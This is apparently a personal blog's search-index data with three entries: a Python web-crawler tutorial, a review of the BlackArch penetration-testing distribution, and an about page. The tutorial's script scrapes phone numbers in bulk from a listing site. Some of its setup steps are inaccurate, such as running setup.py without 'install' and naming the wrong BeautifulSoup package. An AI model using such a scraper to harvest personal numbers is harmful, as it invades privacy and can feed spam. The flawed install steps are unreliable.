Python Python is a cross-platform language, so installation methods differ depending on the platform. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Windows You can download the installation program from Python’s official website and install it. It is recommended to download Python 3. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:1","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Mac OSX Download it from Python’s official website ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:2","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Linux Install it via package manager. deb-based $ sudo apt-get install python3 Arch-based $ sudo pacman -S python rpm-based $ sudo yum install python3 ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:3","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Android Install QPython on the Android platform: Download it from Coolapk QPython Official Website ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:4","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Installing pip The installation programs for Windows and Mac OS X will automatically install pip, but Linux does not. We need to install it manually. What? You’re asking about Android? I don’t know either, hahaha. First, go to this website，and click Download，Download the second tar.gz file, which is a Linux compressed file. Then, extract it to get a pip-19.2.2 directory: $ tar -xvf pip-19.2.2.tar.gz Enter the directory: $ cd ./pip-19.2.2 There is a file called setup.py in there. Execute it using Python: $ sudo python setup.py Then pip will be installed automatically. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:5:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Required Modules The web crawler in this post uses the following modules: requests, for sending HTTP/1.1 requests BeautifulSoup, for parsing HTML and XML documents We can install them using the following command: $ sudo pip install requests BeautifulSoup If you find that the installation speed is slow, you can refer to this link to change the mirror source to a domestic one. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:6:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"Public Code Here’s the code for a simple phone number crawler: from bs4 import BeautifulSoup import requests print(\"简易手机号码抓取工具 By WeepingDogel\") url=\"http://www.hiphop8.com/mobile/xian_1319339.html\" page=requests.get(url) page_info=page.content soup = BeautifulSoup(page_info, \"html.parser\") numbers = soup.find_all('a') with open(\"1319339.txt\",\"w\") as file: for number in numbers: print(number.string) file.write(str(number.string)+\"\\n\") You can copy the above code into a Python file and run or modify it as needed. ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:7:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Programming"],"content":"In Conclusion I wrote this post in a hurry, so it may not be detailed enough. Please forgive me. There’s a comment section below, feel free to leave comments (or criticize me). ","date":"2019-08-13","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:8:0","tags":["Notes","Linux","Python","Programming","Web Crawler"],"title":"Python Learning Notes: Simple Web Crawler","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Linux"],"content":"A nonsensical review of my experience with BlackArch...","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":" Today, I attempted to install BlackArch and spent quite a long time doing so. However, I later discovered that this system was not very perfect. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:0:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Advantages Firstly, let’s talk about its advantages: This thing integrates thousands of software packages, all of which are powerful tools. Secondly, this thing is cool, especially the wallpaper and color matching, which I think are particularly stunning. Its ease of installation is also a plus. Initially, I thought it would be more difficult to install than Arch, but after using it, I found that its installation process is ten times simpler than Arch. It’s just that I’m used to the manual style of Arch and not accustomed to this semi-automated approach. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:1:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Disadvantages Now, let’s talk about the disadvantages: First of all, the ISO is really too big. The official live ISO for BlackArch is 12GB, which took me a long time to download using IDM. The network installation package is the same size as Arch, but I haven’t tried it. What’s more alarming is that the minimum hard disk requirement for installing blackarch’s official mirrors is over 40GB, which makes it difficult for most people to meet this installation condition. Secondly, its desktop environment is too basic and its performance is particularly poor, especially for i3 and spectrwm, which are impossible to operate. Fluxbox is the coolest, but its habits are not suitable for most people. Openbox has nothing, and it’s even harder to operate. It also doesn’t support Chinese, which is very annoying. Also, the dependencies are too messy, making it difficult to switch to other desktop environments. For example, when I wanted to uninstall others and switch to xfce, I couldn’t uninstall them with “pacman -Rs”. I had to use “Rsc” to uninstall them, but as a result, I uninstalled “lxdm”, which prevented me from entering graphics mode. Later, when I installed “lxdm”, there was a major color bug. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:2:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":["Linux"],"content":"Conclusion Firstly, it cannot be denied that BlackArch is a good thing for showing off, but I do not recommend using the official mirror (whether it is an online mirror or an offline live one) for installation, otherwise, you will end up like me. Secondly, users must have a foundation in the Arch series; otherwise, it will be a pitfall. It is recommended to install Arch first and then import BlackArch’s software library to install the full set of tools. Finally, please do not compare BlackArch with Kali or Parrot. They are not comparable in terms of tools. ","date":"2019-06-16","objectID":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/:3:0","tags":["Linux","Arch Linux","Penetration Testing","Hacking"],"title":"BlackArch Experience Report","uri":"/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"categories":"about","content":"Once lost thing will never be able to come back.","date":"0001-01-01","objectID":"/about/","tags":["about"],"title":"About","uri":"/about/"},{"categories":"about","content":" Introduction Hello, I’m WeepingDogel, a college student. I’m Young, Male, Arch User, Python beginner Copyright Statement Unless otherwise noted, all articles on this website are original. This website follows the CC-BY-NC 4.0 license Please indicate the link when reprinting. Some articles use screenshots as covers, most article cover images are from wallhaven.cc. Comment You can leave a comment using the comment plugin below. Contact Links lilydjwg’s Blog 李皓奇 | liolok.com crzy233.github.io mushin2k’s blog Piggy’s Blog 欠陥電気の摸鱼小池 111的 Blog 首页-zhyjc6’s Blog Home | website_project ⑨BIE Garden in the Wonderland 欧式的Blog Dec KiraPGR’s Blog Lynnrin’s Blog poly000客栈 rcd的博客 ","date":"0001-01-01","objectID":"/about/:0:0","tags":["about"],"title":"About","uri":"/about/"}]